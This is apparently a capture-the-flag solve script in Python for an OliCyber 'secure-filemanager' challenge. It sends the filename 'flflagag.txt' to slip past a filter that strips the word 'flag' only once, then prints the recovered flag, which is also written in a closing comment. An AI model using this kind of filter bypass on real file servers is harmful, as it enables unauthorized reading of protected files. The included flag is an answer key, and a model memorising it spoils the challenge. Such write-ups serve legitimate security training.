from pwn import *
import re

host = "secure-filemanager.challs.olicyber.it"
port = 38104
r = remote(host,port)

r.sendlineafter(b': ', b'flflagag.txt') #filename = filename.replace(word, '') vede flag -> unisce i due pezzi e il .txt in flag.txt
flag = r.recv(35).decode()
print(flag)

r.close()

#flag{cleanup_is_broken_c06c4a2d}
